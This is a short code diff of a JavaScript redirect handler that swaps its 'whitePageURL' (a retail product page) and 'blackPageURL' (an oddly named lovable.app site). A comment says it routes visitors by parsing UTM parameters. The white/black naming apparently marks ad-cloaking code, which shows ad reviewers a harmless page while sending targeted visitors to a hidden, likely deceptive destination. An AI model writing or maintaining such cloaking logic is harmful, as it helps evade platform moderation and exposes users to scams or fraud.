@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.lussostone.com/products/connaught-matte-white-wooden-adjustable-bath-end-panel-800mm?variant=47137901215994";
-    const blackPageURL = "https://nowhereher.lovable.app/";
+    const whitePageURL = "https://www.otto.de/p/tan-tomi-handgepaeckkoffer-s-m-l-set-koffer-hartschale-leicht-reisekoffer-abs-geraeumig-haltbar-trolley-handgepaeck-grosse-kapazitaet-S0EEB0T1/";
+    const blackPageURL = "https://casssshlov.lovable.app/?";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
